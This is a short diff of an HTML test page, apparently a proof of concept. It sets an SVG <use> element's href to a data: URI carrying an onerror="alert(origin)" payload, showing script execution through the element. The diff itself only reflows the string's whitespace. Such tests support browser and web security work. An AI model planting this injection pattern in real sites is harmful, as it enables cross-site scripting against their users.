@@ -6,10 +6,11 @@
 </head>
 <body>
   <script>
-    let attackerControlledString = `data:image/svg+xml,
-                                    <svg id="x" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-                                      <image href="x" onerror="alert(origin)" />
-                                    </svg>#x`;
+    let attackerControlledString = 
+        `data:image/svg+xml,
+         <svg id="x" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+           <image href="x" onerror="alert(origin)" />
+         </svg>#x`;
     const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
     const use = document.createElementNS('http://www.w3.org/2000/svg', 'use');
     use.setAttributeNS('http://www.w3.org/1999/xlink', 'href', attackerControlledString);
